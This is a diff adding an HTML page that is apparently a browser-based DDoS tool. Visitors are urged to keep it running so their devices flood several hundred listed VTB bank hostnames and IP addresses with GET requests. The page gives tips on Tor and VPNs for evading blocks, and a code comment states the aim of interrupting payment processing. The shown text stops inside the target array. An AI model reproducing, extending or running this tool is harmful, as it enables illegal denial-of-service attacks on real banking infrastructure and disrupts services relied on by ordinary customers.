@@ -1,0 +1,1371 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 286 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 286</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or  your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+		This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p><span style="font-size:14px;"><u></u><strong>Message from the IT Army of Ukraine regarding Todays targets: </strong></span>&nbsp;<br>
+  &nbsp;&nbsp;VTB removes complaints from official social media and<br>
+  &nbsp;&nbsp;and try to hide problems with online banking.<br>
+  &nbsp;&nbsp;But these are the answers he writes in private to his clients.</p>
+  &nbsp;&nbsp;By the way, work on public services (gosuslugi) is<br>
+  &nbsp;&nbsp;currently added in parallel with VTB, so join in!</p>
+    </p>
+    </div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 286 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between"><a href="https://pages.github.com/" target="_blank" class="style15">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day286.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //Alfa Bank learns to lie from the leadership of its state and deletes angry comments from customers for the sake of a positive atmosphere in the group. The baton passes to VTB Bank. We aim to interrupt payment processing, delay liabilities, undermine bank’s reputation as usual.
+		    'http://vtb.ru:80',
+		    'http://www.vtb.ru:80',
+		    'http://ns4.vtb.ru:80',
+		    'http://195.242.83.129:80',
+		    'http://ns10.vtb.ru:80',
+		    'http://185.179.145.34:80',
+		    'http://ns5.vtb.ru:80',
+		    'http://185.179.147.25:80',
+		    'http://ns6.vtb.ru:80',
+		    'http://185.179.145.22:80',
+		    'http://ns8.vtb.ru:80',
+		    'http://195.242.83.166:80',
+		    'http://ns9.vtb.ru:80',
+		    'http://185.179.147.23:80',
+		    'http://ns7.vtb.ru:80',
+		    'http://195.242.82.166:80',
+		    'http://mx101.vtb.ru:80',
+		    'http://193.164.146.180:80',
+		    'http://mx202.vtb.ru:80',
+		    'http://193.164.146.179:80',
+		    'http://mx102.vtb.ru:80',
+		    'http://193.164.146.181:80',
+		    'http://mx201.vtb.ru:80',
+		    'http://193.164.146.178:80',
+		    'http://ns1.ilb.vtb.ru:80',
+		    'http://193.164.146.159:80',
+		    'http://mx102.vtb.ru:80',
+		    'http://193.164.146.181:80',
+		    'http://ns9.vtb.ru:80',
+		    'http://185.179.147.23:80',
+		    'http://ns2.bsslb.vtb.ru:80',
+		    'http://193.164.146.202:80',
+		    'http://ns2.ilb.vtb.ru:80',
+		    'http://193.164.146.160:80',
+		    'http://ns2.vtb.ru:80',
+		    'http://193.164.146.169:80',
+		    'http://ns5.vtb.ru:80',
+		    'http://185.179.147.25:80',
+		    'http://ns1.bsslb.vtb.ru:80',
+		    'http://193.164.146.201:80',
+		    'http://ns4.vtb.ru:80',
+		    'http://195.242.83.129:80',
+		    'http://ns1.vtb.ru:80',
+		    'http://193.164.146.165:80',
+		    'http://mx3.vtb.ru:80',
+		    'http://193.164.146.33:80',
+		    'http://ns8.vtb.ru:80',
+		    'http://195.242.83.166:80',
+		    'http://ns7.vtb.ru:80',
+		    'http://195.242.82.166:80',
+		    'http://mx202.vtb.ru:80',
+		    'http://193.164.146.179:80',
+		    'http://mx101.vtb.ru:80',
+		    'http://193.164.146.180:80',
+		    'http://mx2.vtb.ru:80',
+		    'http://193.164.146.32:80',
+		    'http://ns6.vtb.ru:80',
+		    'http://185.179.145.22:80',
+		    'http://pop3.dbo.vtb.ru:80',
+		    'https://vtb.ru:443',
+		    'https://www.vtb.ru:443',
+		    'https://ns4.vtb.ru:443',
+		    'https://195.242.83.129:443',
+		    'https://ns10.vtb.ru:443',
+		    'https://185.179.145.34:443',
+		    'https://ns5.vtb.ru:443',
+		    'https://185.179.147.25:443',
+		    'https://ns6.vtb.ru:443',
+		    'https://185.179.145.22:443',
+		    'https://ns8.vtb.ru:443',
+		    'https://195.242.83.166:443',
+		    'https://ns9.vtb.ru:443',
+		    'https://185.179.147.23:443',
+		    'https://ns7.vtb.ru:443',
+		    'https://195.242.82.166:443',
+		    'https://mx101.vtb.ru:443',
+		    'https://193.164.146.180:443',
+		    'https://mx202.vtb.ru:443',
+		    'https://193.164.146.179:443',
+		    'https://mx102.vtb.ru:443',
+		    'https://193.164.146.181:443',
+		    'https://mx201.vtb.ru:443',
+		    'https://193.164.146.178:443',
+		    'https://ns1.ilb.vtb.ru:443',
+		    'https://193.164.146.159:443',
+		    'https://mx102.vtb.ru:443',
+		    'https://193.164.146.181:443',
+		    'https://ns9.vtb.ru:443',
+		    'https://185.179.147.23:443',
+		    'https://ns2.bsslb.vtb.ru:443',
+		    'https://193.164.146.202:443',
+		    'https://ns2.ilb.vtb.ru:443',
+		    'https://193.164.146.160:443',
+		    'https://ns2.vtb.ru:443',
+		    'https://193.164.146.169:443',
+		    'https://ns5.vtb.ru:443',
+		    'https://185.179.147.25:443',
+		    'https://ns1.bsslb.vtb.ru:443',
+		    'https://193.164.146.201:443',
+		    'https://ns4.vtb.ru:443',
+		    'https://195.242.83.129:443',
+		    'https://ns1.vtb.ru:443',
+		    'https://193.164.146.165:443',
+		    'https://mx3.vtb.ru:443',
+		    'https://193.164.146.33:443',
+		    'https://ns8.vtb.ru:443',
+		    'https://195.242.83.166:443',
+		    'https://ns7.vtb.ru:443',
+		    'https://195.242.82.166:443',
+		    'https://mx202.vtb.ru:443',
+		    'https://193.164.146.179:443',
+		    'https://mx101.vtb.ru:443',
+		    'https://193.164.146.180:443',
+		    'https://mx2.vtb.ru:443',
+		    'https://193.164.146.32:443',
+		    'https://ns6.vtb.ru:443',
+		    'https://185.179.145.22:443',
+		    'https://pop3.dbo.vtb.ru:443',
+		    'https://www.rdr.vtb.ru:443',
+		    'https://preprod.vtb.ru:443',
+		    'https://qr.vtb.ru:443',
+		    'https://vb.ilb.vtb.ru:443',
+		    'https://www.mobile.broker.vtb.ru:443',
+		    'https://webcon01.msk.vtb.ru:443',
+		    'https://mbo.vtb.ru:443',
+		    'https://www.osago.vtb.ru:443',
+		    'https://www.hackathon.vtb.ru:443z',
+		    'https://ift-alis.varc.vtb.ru:443',
+		    'https://vb.vtb.ru:443',
+		    'https://rck.vtb.ru:443',
+		    'https://wificert.vtb.ru:443',
+		    'https://ipoteka-online.vtb.ru:443',
+		    'https://winterholidays.vtb.ru:443',
+		    'https://start.vtb.ru:443',
+		    'https://c.vtb.ru:443',
+		    'https://ivpn.vtb.ru:443',
+		    'https://bank-accounts.vtb.ru:443',
+		    'https://www.reg.vtb.ru:443',
+		    'https://mvp.api.vtb.ru:443',
+		    'https://ar2018.vtb.ru:443',
+		    'https://mdmrd201lv.vtb.ru:443',
+		    'https://pay.vtb.ru:443',
+		    'https://gitlab.vtb.ru:443',
+		    'https://mx2001.vtb.ru:443',
+		    'https://bonus.vtb.ru:443',
+		    'https://sso-app2.vtb.ru:443',
+		    'https://m.komission.vtb.ru:443',
+		    'https://mdmmi201lv.vtb.ru:443',
+		    'https://cs.cache2.api.vtb.ru:443',
+		    'https://service5.lkbo.vtb.ru:443',
+		    'https://chat1.vtb.ru:443',
+		    'https://cl.vtb.ru:443',
+		    'https://devchat.vtb.ru:443',
+		    'https://mob.vtb.ru:443',
+		    'https://postext.ufa.vtb.ru:443',
+		    'https://www.wifi.vtb.ru:443',
+		    'https://lk.innovation.vtb.ru:443',
+		    'https://mosmetro.transport.vtb.ru:443',
+		    'https://ar2019.vtb.ru:443',
+		    'https://mbs.vtb.ru:443',
+		    'https://partner.vmeste.vtb.ru:443',
+		    'https://www.wimapi.vtb.ru:443',
+		    'https://new-lk-developer.vtb.ru:443',
+		    'https://mdm.vtb.ru:443',
+		    'https://mi2.vtb.ru:443',
+		    'https://acquiring.vtb.ru:443',
+		    'https://lbns2.vtb.ru:443',
+		    'https://kvpngate2.vtb.ru:443',
+		    'https://www.onboarding.vtb.ru:443',
+		    'https://post.vtb.ru:443',
+		    'https://api.vtb.ru:443',
+		    'https://ift-alis.vacr.vtb.ru:443',
+		    'https://kdrex01.kdr.vtb.ru:443',
+		    'https://ivtb.vtb.ru:443',
+		    'https://www.vb.vtb.ru:443',
+		    'https://www.mvp.api.vtb.ru:443',
+		    'https://young-promo-3.vtb.ru:443',
+		    'https://www.ipoteka.vtb.ru:443',
+		    'https://www.mx202.vtb.ru:443',
+		    'https://marketplace.vtb.ru:443',
+		    'https://ksa.vtb.ru:443',
+		    'https://auth.lk.vtb.ru:443',
+		    'https://webcon02.msk.vtb.ru:443',
+		    'https://sbc-st-a.vtb.ru:443',
+		    'https://brand.vtb.ru:443',
+		    'https://ar2017.vtb.ru:443',
+		    'https://mi2-vpn.vtb.ru:443',
+		    'https://bryansk-ext.bryansk.vtb.ru:443',
+		    'https://zakryt-ip.vtb.ru:443',
+		    'https://post1.vtb.ru:443',
+		    'https://bob.nsk.vtb.ru:443',
+		    'https://mail.tmn.vtb.ru:443',
+		    'https://smtp1.dbo.vtb.ru:443',
+		    'https://welcome.vtb.ru:443',
+		    'https://www.szrc.vtb.ru:443',
+		    'https://www.mx101.vtb.ru:443',
+		    'https://csr2020.vtb.ru:443',
+		    'https://discount.vtb.ru:443',
+		    'https://crm.vtb.ru:443',
+		    'https://webconf.vtb.ru:443',
+		    'https://vo2.vtb.ru:443',
+		    'https://reserve.mb.vtb.ru:443',
+		    'https://ae01.msk.vtb.ru:443',
+		    'https://www.ift-recog.vacr.vtb.ru:443',
+		    'https://headless-cms.vtb.ru:443',
+		    'https://developers.vtb.ru:443',
+		    'https://appweb.broker.vtb.ru:443',
+		    'https://lms.vtb.ru:443',
+		    'https://postout.srn.vtb.ru:443',
+		    'https://admin.vmeste.vtb.ru:443',
+		    'https://www.vitrina.vtb.ru:443',
+		    'https://online.test.vtb.ru:443',
+		    'https://www.passport.api.vtb.ru:443',
+		    'https://idemo.vtb.ru:443',
+		    'https://mgmt-ise201.vtb.ru:443',
+		    'https://webquikdemo.vtb.ru:443',
+		    'https://ar2020.vtb.ru:443',
+		    'https://irkexvtb.irk.vtb.ru:443',
+		    'https://master.broker.vtb.ru:443',
+		    'https://travel.vtb.ru:443',
+		    'https://www.lkbo.vtb.ru:443',
+		    'https://itogi2020.vtb.ru:443',
+		    'https://ae.transport.vtb.ru:443',
+		    'https://webcall.vtb.ru:443',
+		    'https://www.headless-cms.vtb.ru:443',
+		    'https://www.ar2018.vtb.ru:443',
+		    'https://dbo.vtb.ru:443',
+		    'https://sharing.vtb.ru:443',
+		    'https://bla.vtb.ru:443',
+		    'https://somik.vtb.ru:443',
+		    'https://multicarta.vtb.ru:443',
+		    'https://mx-srv.kursk.vtb.ru:443',
+		    'https://mdm201lv.vtb.ru:443',
+		    'https://realty.vtb.ru:443',
+		    'https://multilife.vtb.ru:443',
+		    'https://newspaper.vtb.ru:443',
+		    'https://bo.vtb.ru:443',
+		    'https://sbc-pr-a.vtb.ru:443',
+		    'https://esmdtpep.vtb.ru:443',
+		    'https://webquik.vtb.ru:443',
+		    'https://wimapi.vtb.ru:443',
+		    'https://kdelu.vtb.ru:443',
+		    'https://troika.transport.vtb.ru:443',
+		    'https://developer.vtb.ru:443',
+		    'https://mx2.vtb.ru:443',
+		    'https://mx5001.vtb.ru:443',
+		    'https://dm.vtb.ru:443',
+		    'https://ns1.bsslb.vtb.ru:443',
+		    'https://young-promo.vtb.ru:443',
+		    'https://vmeste.vtb.ru:443',
+		    'https://mail.bonus.vtb.ru:443',
+		    'https://mail.tomsk.vtb.ru:443',
+		    'https://www.ipoteka-online.vtb.ru:443',
+		    'https://tmn.vtb.ru:443',
+		    'https://api.innovation.vtb.ru:443',
+		    'https://rdr.vtb.ru:443',
+		    'https://3dsp2v.vtb.ru:443',
+		    'https://access.vtb.ru:443',
+		    'https://www.reserve.mb.vtb.ru:443',
+		    'https://www.dachatbot.vtb.ru:443',
+		    'https://3ds.vtb.ru:443',
+		    'https://pv.vtb.ru:443',
+		    'https://tips.vtb.ru:443',
+		    'https://barmail.bar.vtb.ru:443',
+		    'https://sip.msk.vtb.ru:443',
+		    'https://autodiscover.vtb.ru:443',
+		    'https://olbdemo.vtb.ru:443',
+		    'https://www.shareholder-guide.vtb.ru:443',
+		    'https://yrs.vtb.ru:443',
+		    'https://post2.vtb.ru:443',
+		    'https://perevodworld.vtb.ru:443',
+		    'https://dam.vtb.ru:443',
+		    'https://www.pogashenie.vtb.ru:443',
+		    'https://mx.bla.vtb.ru:443',
+		    'https://innovation.vtb.ru:443',
+		    'https://m.vtb.ru:443',
+		    'https://en.kz.vtb.ru:443',
+		    'https://www.mc.vtb.ru:443',
+		    'https://www.pp-alis.vacr.vtb.ru:443',
+		    'https://mgt.api.vtb.ru:443',
+		    'https://osago.vtb.ru:443',
+		    'https://cifra.vtb.ru:443',
+		    'https://hf-chat-sharing.vtb.ru:443',
+		    'https://mobi-ift.vtb.ru:443',
+		    'https://mobi-vpn-rr.vtb.ru:443',
+		    'https://paybypay.vtb.ru:443',
+		    'https://async-online.vtb.ru:443',
+		    'https://chat.vtb.ru:443',
+		    'https://web.transport.vtb.ru:443',
+		    'https://mtppk.transport.vtb.ru:443',
+		    'https://barracuda.spb.vtb.ru:443',
+		    'https://i.bsslb.vtb.ru:443',
+		    'https://quikm.vtb.ru:443',
+		    'https://www.mobile-mib.broker.vtb.ru:443',
+		    'https://dachatbot.vtb.ru:443',
+		    'https://service3.lkbo.vtb.ru:443',
+		    'https://wifi.vtb.ru:443',
+		    'https://online-pro.vtb.ru:443',
+		    'https://www.quikm.vtb.ru:443',
+		    'https://www.devchat.vtb.ru:443',
+		    'https://pogashenie.vtb.ru:443',
+		    'https://www.tips.vtb.ru:443',
+		    'https://mx5002.vtb.ru:443',
+		    'https://young-promo-1.vtb.ru:443',
+		    'https://online-old.vtb.ru:443',
+		    'https://mm.transport.vtb.ru:443',
+		    'https://kasko.vtb.ru:443',
+		    'https://pnm.vtb.ru:443',
+		    'https://doc.vtb.ru:443',
+		    'https://mdm.ilb.vtb.ru:443',
+		    'https://sml.vtb.ru:443',
+		    'https://adchatbot.vtb.ru:443',
+		    'https://vtbank.astra.vtb.ru:443',
+		    'https://mobile-pilot.vtb.ru:443',
+		    'https://mostran.vtb.ru:443',
+		    'https://wac-ext01.msk.vtb.ru:443',
+		    'https://passport.api.vtb.ru:443',
+		    'https://chat2.vtb.ru:443',
+		    'https://service4.lkbo.vtb.ru:443',
+		    'https://transport.vtb.ru:443',
+		    'https://mdmmi101lv.vtb.ru:443',
+		    'https://mi-vpn.vtb.ru:443',
+		    'https://www.moretech.vtb.ru:443',
+		    'https://nalog.vtb.ru:443',
+		    'https://apple.stage.transport.vtb.ru:443',
+		    'https://moretech.vtb.ru:443',
+		    'https://online.vtb.ru:443',
+		    'https://lk.pogashenie.vtb.ru:443',
+		    'https://mdm202lv.vtb.ru:443',
+		    'https://admin.bonus.vtb.ru:443',
+		    'https://mail1.penza.vtb.ru:443',
+		    'https://www.marketplace.vtb.ru:443',
+		    'https://www.perevodworld.vtb.ru:443',
+		    'https://www.online-beta2.vtb.ru:443',
+		    'https://chita.vtb.ru:443',
+		    'https://magazine.vtb.ru:443',
+		    'https://lbns1.vtb.ru:443',
+		    'https://post4.vtb.ru:443',
+		    'https://nsk.vtb.ru:443',
+		    'https://bqr.vtb.ru:443',
+		    'https://www.db.vtb.ru:443',
+		    'https://delo.vtb.ru:443',
+		    'https://www.lk.broker.vtb.ru:443',
+		    'https://remote.vtb.ru:443',
+		    'https://lkbo.vtb.ru:443',
+		    'https://lite.vtb.ru:443',
+		    'https://hackathon.vtb.ru:443',
+		    'https://team.vtb.ru:443',
+		    'https://pp-alis.vacr.vtb.ru:443',
+		    'https://academy.vtb.ru:443',
+		    'https://www.testkomisson.vtb.ru:443',
+		    'https://www.private.vtb.ru:443',
+		    'https://learn.vtb.ru:443',
+		    'https://mail2.penza.vtb.ru:443',
+		    'https://mobile.broker.vtb.ru:443',
+		    'https://www.pp-synt.vacr.vtb.ru:443',
+		    'https://mos.transport.vtb.ru:443',
+		    'https://online.ilb.vtb.ru:443',
+		    'https://stav.vtb.ru:443',
+		    'https://zalog.vtb.ru:443',
+		    'https://anketa.vtb.ru:443',
+		    'https://vtbteam-ets.vtb.ru:443',
+		    'https://www.esmdtpep.vtb.ru:443',
+		    'https://www.lite-pentest.vtb.ru:443',
+		    'https://epa.api.vtb.ru:443',
+		    'https://ka.vtb.ru:443',
+		    'https://vo1.vtb.ru:443',
+		    'https://k5-chat.vtb.ru:443',
+		    'https://msk.vtb.ru:443',
+		    'https://pay-games.vtb.ru:443',
+		    'https://mx102.vtb.ru:443',
+		    'https://m.ilb.vtb.ru:443',
+		    'https://mail.kravtb.vtb.ru:443',
+		    'https://3dsp2.vtb.ru:443',
+		    'https://bo-gate-1c.vtb.ru:443',
+		    'https://sbc-proxy.vtb.ru:443',
+		    'https://sbc-st-b.vtb.ru:443',
+		    'https://mgmt-ise401.vtb.ru:443',
+		    'https://mi.ilb.vtb.ru:443',
+		    'https://post3.vtb.ru:443',
+		    'https://test2048.vtb.ru:443',
+		    'https://ift-ibrb1-sharing.vtb.ru:443',
+		    'https://www.bqr.vtb.ru:443',
+		    'https://if-online.test.vtb.ru:443',
+		    'https://smtp.ilb.dbo.vtb.ru:443',
+		    'https://smtp.dbo.vtb.ru:443',
+		    'https://ankety.vtb.ru:443',
+		    'https://www.dbo.vtb.ru:443',
+		    'https://csr2017.vtb.ru:443',
+		    'https://cs.cache.api.vtb.ru:443',
+		    'https://el-market.vtb.ru:443',
+		    'https://cdn.vtb.ru:443',
+		    'https://alpp-docs.vtb.ru:443',
+		    'https://link.vtb.ru:443',
+		    'https://lk-developer.vtb.ru:443',
+		    'https://ift-chat-sharing.vtb.ru:443',
+		    'https://admin-pilot.vtb.ru:443',
+		    'https://mx2002.vtb.ru:443',
+		    'https://dostavka.vtb.ru:443',
+		    'https://ift-chat.vtb.ru:443',
+		    'https://ul.vtb.ru:443',
+		    'https://www.dm.vtb.ru:443',
+		    'https://www.ar2020.vtb.ru:443',
+		    'https://cc.vtb.ru:443',
+		    'https://mgt.transport.vtb.ru:443',
+		    'https://www.accr.vtb.ru:443',
+		    'https://lt-ibrb.test.vtb.ru:443',
+		    'https://www.online.vtb.ru:443',
+		    'https://www.kabinet.vtb.ru:443',
+		    'https://mobi-da.vtb.ru:443',
+		    'https://mobi-rr.vtb.ru:443',
+		    'https://mobi-vpn-da.vtb.ru:443',
+		    'https://traveling-routes.vtb.ru:443',
+		    'https://mx202.vtb.ru:443',
+		    'https://mobile-mib.broker.vtb.ru:443',
+		    'https://mg1.vtb.ru:443',
+		    'https://www.itogi2020.vtb.ru:443',
+		    'https://www.3ds.vtb.ru:443',
+		    'https://fatca.vtb.ru:443',
+		    'https://business.vtb.ru:443',
+		    'https://gallery360.vtb.ru:443',
+		    'https://wac-ext02.msk.vtb.ru:443',
+		    'https://mail.vtb.ru:443',
+		    'https://20.vtb.ru:443',
+		    'https://www.ift-synt.vacr.vtb.ru:443',
+		    'https://dppe.vtb.ru:443',
+		    'https://pfm.vtb.ru:443',
+		    'https://kz.vtb.ru:443',
+		    'https://www.mx102.vtb.ru:443',
+		    'https://shareholder-guide.vtb.ru:443',
+		    'https://ipoteka.vtb.ru:443',
+		    'https://business-kit.vtb.ru:443',
+		    'https://push-server.vtb.ru:443',
+		    'https://www.traveling-routes.vtb.ru:443',
+		    'https://mail.vla.vtb.ru:443',
+		    'https://send.vtb.ru:443',
+		    'https://prod-web-anketa-api.vtb.ru:443',
+		    'https://bel.vtb.ru:443',
+		    'https://socexvtb.soc.vtb.ru:443',
+		    'https://rr-ibrb.test.vtb.ru:443',
+		    'https://www.chat-sharing.vtb.ru:443',
+		    'https://mdm101lv.vtb.ru:443',
+		    'https://school.vtb.ru:443',
+		    'https://ligabisnesa.vtb.ru:443',
